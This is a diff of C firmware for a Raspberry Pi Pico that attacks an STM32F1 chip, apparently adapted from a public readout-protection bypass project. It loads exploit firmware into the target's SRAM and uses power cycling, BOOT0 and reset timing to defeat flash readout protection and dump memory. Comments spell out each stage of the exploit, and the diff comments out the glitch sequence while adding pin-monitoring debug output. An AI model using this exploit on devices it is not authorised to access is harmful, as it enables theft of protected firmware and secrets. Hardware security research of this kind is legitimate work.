@@ -37,7 +37,7 @@
 #include "config.h"
 #include "payload.h"
 
-int bmp_loader(const char *data, uint32_t length, uint32_t offset);
+int bmp_loader(const char *data, uint32_t length, uint32_t offset, bool check_only);
 
 // Exact steps for attack:
 //  Power pins high
@@ -75,7 +75,6 @@ static void target_power(bool on)
 
 static void handle_control(uint32_t timeout_ms)
 {
-	printf("Target not found... retrying\n");
 	int c = getchar_timeout_us(timeout_ms * 1000);
 	if (c == PICO_ERROR_TIMEOUT) {
 		return;
@@ -100,10 +99,28 @@ static void handle_control(uint32_t timeout_ms)
 	}
 }
 
+static void validate_reset(void)
+{
+	if (!gpio_get(RESET_PIN)) {
+		printf("Target is already in RESET! Ensure target is active before continuing.\r\n");
+		while (!gpio_get(RESET_PIN)) {
+			handle_control(500);
+		}
+	}
+}
+
+static char payload_swapped[sizeof(payload) + 4];
+
 int main()
 {
 	stdio_init_all();
 	while (!tud_cdc_connected()) {
+	}
+
+	// Byteswap the payload
+
+	for (int i = 0; i < sizeof(payload) / 4; i += 1) {
+		payload_swapped[i] = __builtin_bswap32(payload[i]);
 	}
 
 	// Init GPIOs
@@ -120,6 +137,7 @@ int main()
 	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 	gpio_pull_up(RESET_PIN);
+	gpio_put(RESET_PIN, 0);
 	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
 
 	// Init PWM for indicator LED
@@ -132,10 +150,6 @@ int main()
 	// -- Attack begins here --
 
 	// Set BOOT0 to high and enable power
-
-	/* Boot into SRAM so we can fetch SRAM reset vector address
-	 * See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
-	 */
 	gpio_put(BOOT0_PIN, 1);
 
 	/* Enable power
@@ -143,84 +157,94 @@ int main()
 	 * to prevent the target from sinking current through the pin if the debug
 	 * probe is already attached
 	 */
-	target_power(1);
+	target_power(true);
 	gpio_set_dir(POWER1_PIN, GPIO_OUT);
 	gpio_set_dir(POWER2_PIN, GPIO_OUT);
 	gpio_set_dir(POWER3_PIN, GPIO_OUT);
 
 	gpio_put(LED_PIN, 0);
 
-	while (!gpio_get(RESET_PIN)) {
-		printf("Target is already in RESET! Ensure target is active before continuing.\r\n");
+	validate_reset();
+
+	// Load the exploit firmware onto the target
+	while (bmp_loader(payload, sizeof(payload) & ~3, 0x20000000, false) != 0) {
+		printf("Target not found... retrying\n");
 		handle_control(500);
 	}
 
-	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
-
-	while (bmp_loader(payload, sizeof(payload), 0x20000000) != 0) {
-		handle_control(500);
-	}
-
-	printf("Connected to target\n");
+	printf("Connected to target. Firmware is now loaded into SRAM.\n");
 	sleep_ms(1000);
 
-	printf("Found target. Loading exploit...\n");
+	validate_reset();
 
-	// Wait for any serial input to start the attack
-	int i = 0;
-	while (getchar_timeout_us(500 * 1000) == PICO_ERROR_TIMEOUT) {
-		printf("%d: Load firmware via JTAG. Press any key to start the attack...\r\n", i += 1);
-		handle_control(500);
-	}
+	printf("Starting attack...\n");
 
-	printf("Starting attack...\r\n");
+	// // Set SWCLK and SWDIO pins to inputs since we'll be using them
+	// // to exfiltrate data. Additionally, we don't want to power the
+	// // target via phantom current on the SWD pins.
+	// gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	// gpio_set_dir(SWDIO_PIN, GPIO_IN);
 
-	// Drop the power
-	gpio_put(LED_PIN, 1);
-	gpio_put(POWER1_PIN, 0);
-	gpio_put(POWER2_PIN, 0);
-	gpio_put(POWER3_PIN, 0);
-
-	// Wait for reset to go low
-	while (gpio_get(RESET_PIN)) {
-		tight_loop_contents();
-	}
-
-	// Immediately re-enable power
-	gpio_put(POWER1_PIN, 1);
-	gpio_put(POWER2_PIN, 1);
-	gpio_put(POWER3_PIN, 1);
-
-	// Debugger lock is now disabled and we're now
-	// booting from SRAM. Wait for the target to run stage 1
-	// of the exploit which sets the FPB to jump to stage 2
-	// when the PC reaches a reset vector fetch (0x00000004)
-	sleep_ms(15);
-
-	// Set BOOT0 to boot from flash. This will trick the target
-	// into thinking it's running from flash, which will
-	// disable readout protection.
-	gpio_put(BOOT0_PIN, 0);
-
-	// Reset the target
 	gpio_set_dir(RESET_PIN, GPIO_OUT);
-	gpio_put(RESET_PIN, 0);
-
-	// Wait for reset
-	sleep_ms(15);
-
-	// Release reset
-	// Due to the FPB, the target will now jump to
-	// stage 2 of the exploit and dump the contents
-	// of the flash over UART
+	sleep_ms(10);
 	gpio_set_dir(RESET_PIN, GPIO_IN);
-	gpio_pull_up(RESET_PIN);
 
-	printf("Starting UART shell.\r\n");
+	// // Drop the power
+	// gpio_put(LED_PIN, 1);
+	// target_power(false);
+
+	// // Wait for reset to go low
+	// int count = 0;
+	// while (gpio_get(RESET_PIN)) {
+	// 	count += 1;
+	// 	// tight_loop_contents();
+	// }
+
+	// // Immediately re-enable power
+	// target_power(true);
+
+	// printf("Target powered off after %d ticks\n", count);
+	// bmp_loader(payload_swapped, sizeof(payload_swapped), 0x20000000, true);
+
+	// // Debugger lock is now disabled and we're now
+	// // booting from SRAM. Wait for the target to run stage 1
+	// // of the exploit which sets the FPB to jump to stage 2
+	// // when the PC reaches a reset vector fetch (0x00000004)
+	// sleep_ms(15);
+
+	// // Set BOOT0 to boot from flash. This will trick the target
+	// // into thinking it's running from flash, which will
+	// // disable readout protection.
+	// gpio_put(BOOT0_PIN, 0);
+
+	// // Reset the target
+	// gpio_set_dir(RESET_PIN, GPIO_OUT);
+	// gpio_put(RESET_PIN, 0);
+
+	// // Wait for reset
+	// sleep_ms(15);
+
+	// // Release reset
+	// // Due to the FPB, the target will now jump to
+	// // stage 2 of the exploit and dump the contents
+	// // of the flash over UART
+	// gpio_set_dir(RESET_PIN, GPIO_IN);
+	// gpio_pull_up(RESET_PIN);
+
+	printf("Reading data from target...\n");
 
 	// Forward dumped data from UART to USB serial
-	uint stalls = 0;
+	static int last_swclk = 0;
+	static int last_swdio = 0;
 	while (true) {
+		if (gpio_get(SWCLK_PIN) != last_swclk) {
+			last_swclk = !last_swclk;
+			printf("SWCLK %d -> %d\n", !last_swclk, last_swclk);
+		}
+		if (gpio_get(SWDIO_PIN) != last_swdio) {
+			last_swdio = !last_swdio;
+			printf("SWDIO %d -> %d\n", !last_swdio, last_swdio);
+		}
 		handle_control(500);
 
 		// int c;
